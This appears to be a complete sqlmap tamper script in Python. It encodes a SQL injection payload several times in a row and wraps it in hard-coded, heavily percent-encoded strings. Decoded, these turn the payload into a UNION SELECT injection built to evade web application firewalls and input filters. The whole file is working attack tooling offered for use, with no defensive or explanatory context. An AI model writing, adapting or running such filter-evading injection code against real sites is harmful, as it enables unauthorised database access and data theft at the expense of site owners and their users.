#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.NORMAL


def tamper(payload, **kwargs):
    retVal = payload
    for i in range(2):
        retVal = encode(retVal)
    encode_string = retVal
    retVal1 = urllib.parse.quote(encode_string, safe='')
    str1111="%2525%2532%2539%2525%2532%2562%2525%2532%2537"
    str2222="%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538"
    retVal=str2222+retVal1+str1111
    return retVal
#编码
def encode(payload):
    encode_payload = ""
    for char in payload:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_payload += encode_char
    return encode_payload